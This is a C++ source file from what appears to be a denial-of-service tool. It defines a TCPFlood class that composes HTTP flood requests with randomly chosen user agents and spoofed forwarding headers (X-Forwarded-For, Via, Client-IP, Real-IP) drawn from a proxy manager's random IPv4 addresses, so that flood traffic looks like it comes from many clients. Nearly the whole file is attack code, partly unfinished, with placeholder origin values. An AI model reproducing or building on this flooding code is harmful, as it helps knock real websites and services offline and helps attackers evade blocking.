#include "../include/TCPFlood.h"

TCPFlood::TCPFlood(string address, uint16_t port)
	: Flood(address, port)
	, request("")
	, header("")
	, defaultHeader("") // for case if the code below will fail
{
	// TODO: find out parsing similar to Python's YARL
	// compile default header
	
	ProxyManager* proxyManager = ProxyManager::getInstance();
	string ip = proxyManager->getRandomIPv4(); //   ip: str = Tools.rand_ipv4()
    
    string origin = "111.222.333.444"; //    origin = str(self._url.origin())
    string raw_authority = "111.111.111.111"; // self._url.raw_authority
    string user_agent =  USERAGENTS[rand() % USERAGENTS.size()];
    
    this->defaultHeader = flood::TCPHeaderBase
		+ "Host: " + raw_authority + rn
        + "Origin: " + origin + rn
        + "Referer: " + origin + rn // emulate Referrer-Policy: origin
        + "User-Agent: " + user_agent + rn
        + "X-Forwarded-Host: " + raw_authority + rn
        + "Via: " + ip + rn
        + "Client-IP: " + ip + rn
        + "X-Forwarded-Proto: " + "https" + rn
        + "X-Forwarded-For: "+ ip + rn
        + "Real-IP: " + ip
    ;
}

const string& TCPFlood::getHeader() const { return this->header; }

const string& TCPFlood::getRequest() const { return this->request; }

const string& TCPFlood::getDefaultHeader() const { return this->defaultHeader; }

void TCPFlood::createRequest(flood::RequestType reqestType, const string& qsPathRaw, const string& body)
{
	// method is unsafe because assumes header is already created and request type is valid
	this->request += flood::RequestTypeStr.at(reqestType);
	this->request += " ";
	this->request += qsPathRaw;
	this->request += " HTTP/1.1" + rn;
	this->request += this->header;
	this->request += rn + rn;
	this->request += body;
}


void TCPFlood::setHeader(const string& headers)
{
		this->header = headers;
}
